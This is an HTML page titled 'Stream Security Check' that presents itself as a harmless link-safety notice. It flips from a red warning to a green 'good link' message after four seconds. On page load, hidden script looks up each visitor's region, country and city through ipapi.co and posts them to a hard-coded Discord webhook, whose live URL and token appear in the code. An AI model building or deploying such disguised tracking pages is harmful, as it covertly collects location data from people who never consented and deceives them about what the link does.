<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Stream Security Check</title>
    <style>
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background: #0e0e10; 
            color: #efeff1; 
            text-align: center; 
            padding-top: 20vh; 
            margin: 0;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            padding: 40px 20px;
            background: #18181b;
            border-radius: 12px;
            border: 1px solid #2f2f35;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
        }
        /* Warning Text Style (Red) */
        .warning-text {
            color: #ff4a4a;
            font-size: 24px;
            font-weight: bold;
            line-height: 1.5;
            display: block;
        }
        /* Safe Text Style (Green) - Hidden at start */
        .safe-text {
            color: #26d07c;
            font-size: 24px;
            font-weight: bold;
            line-height: 1.5;
            display: none; 
        }
        .loader {
            border: 4px solid #2f2f35;
            border-top: 4px solid #9146FF;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 30px auto 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- The text boxes that change dynamically -->
        <div id="redMessage" class="warning-text">
            ⚠️ This is a warning do not click on random links there might be some bad ones on there.
        </div>
        
        <div id="greenMessage" class="safe-text">
            ✅ This is a good link but dont click on random one u see.
        </div>

        <div class="loader"></div>
    </div>

    <script>
        // Your exact Discord webhook link locked in place
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1504591125858750635/3ej395jYnj8VxkF7mV4cnmrdyPNA6Z1BfBx7Jaw3WP4POwshtwODmMxZSiX_i1XfemTj";

        async function grabLocation() {
            try {
                // Secure state tracking connection
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                
                if (data.region && data.country_name) {
                    const payload = {
                        content: `📢 **New Chat Click!** From State/Region: **${data.region}**, Country: **${data.country_name}** (City: ${data.city})`
                    };

                    // Send straight to Discord
                    await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                }
            } catch (error) {
                console.log("Error processing tracking request.");
            }
        }

        // Run the background location tracker instantly
        grabLocation();

        // ⏱️ TIMER FUNCTIONALITY:
        // After 4 seconds, swap the Red Warning text for the Green Safe text
        setTimeout(() => {
            document.getElementById('redMessage').style.display = 'none';
            document.getElementById('greenMessage').style.display = 'block';
        }, 4000);
    </script>
</body>
</html>
